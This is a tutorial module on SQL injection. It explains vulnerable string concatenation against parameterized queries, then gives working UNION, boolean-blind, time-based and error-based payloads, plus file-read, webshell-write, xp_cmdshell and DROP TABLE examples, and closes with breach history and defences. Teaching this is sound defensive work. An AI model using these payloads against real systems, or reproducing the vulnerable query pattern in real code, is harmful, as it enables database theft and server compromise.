Module 11 — SQL Injection

The Grandfather of Web Vulnerabilities

SQL injection has been around since the late 1990s. It was first publicly documented by Jeff Forristal (writing as "rain.forest.puppy") in Phrack Magazine in 1998. That is over 25 years ago. And yet, in 2024, SQLi still appears in the OWASP Top 10 and still causes massive data breaches. Why? Because the fundamental mistake — mixing code and data — is incredibly easy to make and remarkably hard to stamp out across large codebases.

Here is the thing that makes SQL injection so dangerous: it gives the attacker direct access to your database. Not filtered access. Not read-only access. Full access to every table, every row, every column. And in many configurations, it can go beyond the database — reading files from the server's filesystem, executing operating system commands, or pivoting to other systems on the network.

If XSS is picking someone's pocket, SQL injection is walking into the bank vault.

Why SQL Injection Exists

Every SQL injection vulnerability has the same root cause: user-supplied input is concatenated directly into a SQL query string. The database engine receives the complete query as one string and has no way to distinguish between the parts that are "code" (the SQL structure the developer wrote) and the parts that are "data" (the values the user provided).

Let me show you exactly how this works. Imagine a login form that checks credentials against a database:

Vulnerable Code: String Concatenation

# Python — VULNERABLE
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password_hash='{password}'"
cursor.execute(query)
// PHP — VULNERABLE
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password_hash='$password'";
$result = mysqli_query($conn, $query);

When a normal user types alice and mypassword, the query becomes: 

SELECT * FROM users WHERE username='alice' AND password_hash='mypassword'

Perfectly fine. But what happens when an attacker types ' OR '1'='1 as the username? 

SELECT * FROM users WHERE username='' OR '1'='1' AND password_hash='anything'

The attacker's single quote closes the username string, and then OR '1'='1' is interpreted as SQL code, not data. Because '1'='1' is always true, the WHERE clause matches every row, and the attacker is logged in — usually as the first user in the table, which is often the admin.

The fundamental problem: When you concatenate strings into a query, the database cannot tell where the developer's SQL ends and the user's data begins. The single quote character serves double duty — it is both a string delimiter in SQL and a perfectly valid character in user input. This ambiguity is the root of all SQL injection.

The Fix: Parameterized Queries

Parameterized queries (also called prepared statements) solve this completely by separating the SQL structure from the data values. The SQL template is sent to the database first, and the user values are sent separately. The database knows exactly which parts are code and which are data — injection becomes impossible. 

# Python — SAFE (parameterized)
cursor.execute(
    "SELECT * FROM users WHERE username=? AND password_hash=?",
    (username, password)
)
// PHP — SAFE (prepared statement)
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password_hash=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();

Even if the attacker types ' OR '1'='1, the database treats the entire string as a literal username value. It searches for a user whose username is literally the text ' OR '1'='1 — which does not exist. No injection. No bypass.

Analogy: Imagine filling out a paper form. String concatenation is like letting the user write on the form itself — they could write outside the boxes and change the form's instructions. Parameterized queries are like having the user write on sticky notes that go INTO the boxes — no matter what they write, it stays inside the designated area and cannot modify the form structure.

UNION-Based SQL Injection

Authentication bypass is just the beginning. The real power of SQL injection is data extraction. A UNION SELECT attack appends a second query to the original, letting the attacker read data from ANY table in the database. It is like being able to photocopy any file in a filing cabinet — not just the one someone handed you.

There are two requirements for a UNION attack to work:

  1. The number of columns in the injected SELECT must exactly match the original query.
  2. The data types of corresponding columns must be compatible (or use NULL, which is compatible with everything).

Step 1 — Discover the Column Count

Before you can use UNION, you need to know how many columns the original query returns. There are two reliable techniques:

Technique A — ORDER BY probing: Increment the column index until an error occurs. The last successful index tells you the column count. 

-- If the query has 4 columns:
' ORDER BY 1--    (OK — column 1 exists)
' ORDER BY 2--    (OK — column 2 exists)
' ORDER BY 3--    (OK — column 3 exists)
' ORDER BY 4--    (OK — column 4 exists)
' ORDER BY 5--    (ERROR! — column 5 does not exist → table has 4 columns)

Technique B — UNION SELECT NULL probing: Add NULLs until the query succeeds. 

' UNION SELECT NULL--                     (error — wrong column count)
' UNION SELECT NULL,NULL--                (error)
' UNION SELECT NULL,NULL,NULL--           (error)
' UNION SELECT NULL,NULL,NULL,NULL--      (success! — 4 columns)

Step 2 — Identify Output Columns

Not all columns may be displayed on the page. Replace NULLs with test values to see which columns appear in the output: 

' UNION SELECT 'col1','col2','col3','col4'--

If you see "col2" and "col3" in the page but not "col1" and "col4", you know to put your extracted data in columns 2 and 3.

Step 3 — Extract Data

Now you can pull data from any table. Use group_concat() to merge multiple rows into a single value when only one output column is available: 

-- Extract all usernames and password hashes
' UNION SELECT NULL, group_concat(username || ':' || password_hash, '<br>'), NULL, NULL FROM users--

Schema Enumeration — Finding What to Steal

Before you can extract data, you need to know what tables and columns exist. Every database has a way to query its own structure:

DatabaseList TablesList Columns
SQLiteSELECT name FROM sqlite_master WHERE type='table'SELECT sql FROM sqlite_master WHERE name='tablename'
MySQLSELECT table_name FROM information_schema.tablesSELECT column_name FROM information_schema.columns WHERE table_name='...'
PostgreSQLSELECT tablename FROM pg_catalog.pg_tablesSELECT column_name FROM information_schema.columns WHERE table_name='...'
SQL ServerSELECT name FROM sys.tablesSELECT name FROM sys.columns WHERE object_id=OBJECT_ID('...')

In a UNION attack, you would first enumerate tables, then enumerate columns for interesting tables, then extract the actual data. It is a methodical, three-step process.

Blind SQL Injection — When You Cannot See the Output

What if the application does not display query results on the page? What if it just shows "Login successful" or "Login failed" with no data? You might think SQL injection is useless in this case. You would be wrong.

Blind SQL injection lets you extract data one bit at a time by asking the database yes/no questions and observing how the application behaves differently.

Boolean-Based Blind

If the application behaves differently for true vs false conditions (different page content, different HTTP status code, different response size), you can extract data character by character: 

-- Is the first character of the admin password 'a'?
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
-- If the page loads normally → 'a' is correct
-- If the page shows an error → 'a' is wrong, try 'b', 'c', etc.

This is painfully slow by hand — extracting a 32-character password hash requires up to 32 x 36 = 1,152 requests (for each position, try each possible character). But tools like sqlmap automate this process with binary search optimizations and can extract entire databases in minutes.

Time-Based Blind

What if the application gives the EXACT same response regardless of the query result? No different content, no different status code, nothing. In this case, you can use the database's sleep function to create an observable timing difference: 

-- MySQL: if the first char of the DB name is 'a', wait 5 seconds
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--

-- PostgreSQL equivalent
'; SELECT CASE WHEN SUBSTRING(current_database(),1,1)='a' THEN pg_sleep(5) END--

-- SQLite (uses heavy computation instead of sleep)
' AND CASE WHEN SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'
  THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000)))) END--

If the response takes 5 seconds, the condition was true. If it returns immediately, the condition was false. Slow? Extremely. But it works, and when you have no other option, slow extraction is infinitely better than no extraction.

sqlmap — The Swiss Army Knife: In real-world pentesting, nobody does blind SQLi by hand. The tool sqlmap automates detection and exploitation of all SQL injection types. Give it a URL with a suspected injection point, and it will identify the database type, enumerate tables, and dump data. But understanding the techniques manually is essential — automated tools fail on edge cases, and you need to know what to do when they do.

Error-Based Injection

When the application displays database error messages (a misconfiguration, but a common one), attackers can craft queries that cause the extracted data to appear inside the error message itself: 

-- MySQL error-based extraction (EXTRACTVALUE technique)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
-- Error: "XPATH syntax error: '~5.7.44~'"
-- The database version is right there in the error message!

Beyond Data Theft — Advanced SQLi Impact

Extracting data is the most common goal, but SQL injection can go much further depending on the database configuration:

  • Reading files from the server: MySQL's LOAD_FILE('/etc/passwd') reads arbitrary files
  • Writing files to the server: INTO OUTFILE '/var/www/shell.php' can write a webshell
  • OS command execution: SQL Server's xp_cmdshell executes operating system commands directly
  • Stacked queries: If the driver supports it, you can execute entirely separate statements: '; DROP TABLE users;--
Stacked queries caveat: Not all database drivers support multiple statements in one call. PHP's mysqli_query() does not by default. Python's sqlite3.execute() does not. But executescript() does, and SQL Server's default drivers do. Always test whether stacked queries work before assuming they do not.

Real-World SQL Injection Breaches

SQL injection has been responsible for some of the largest data breaches in history:

  • Heartland Payment Systems (2008): Albert Gonzalez used SQL injection to steal 130 million credit card numbers. He was sentenced to 20 years in federal prison — the longest sentence ever for a computer crime at the time.
  • Sony Pictures (2011): LulzSec exploited a trivially simple SQL injection in Sony's website to exfiltrate 1 million user accounts. They publicly mocked Sony for using unparameterized queries.
  • TalkTalk (2015): A 15-year-old exploited SQL injection to access personal details of 157,000 customers. TalkTalk was fined £400,000 — the largest fine by the UK ICO at the time.
  • MOVEit Transfer (2023): A SQL injection in the file transfer product was exploited by the Cl0p ransomware group, affecting over 2,600 organizations and 77 million people.
The Complete Defense Stack:
  • Parameterized queries everywhere — this alone prevents 99% of SQLi
  • Least-privilege DB accounts — the web app's DB user should not be root
  • Web Application Firewall (WAF) — catches obvious payloads, but is bypassable
  • Input validation — reject inputs with unexpected characters as a defense-in-depth layer
  • Error handling — never show raw database errors to users
  • ORM usage — Django ORM, SQLAlchemy, ActiveRecord all use parameterized queries by default
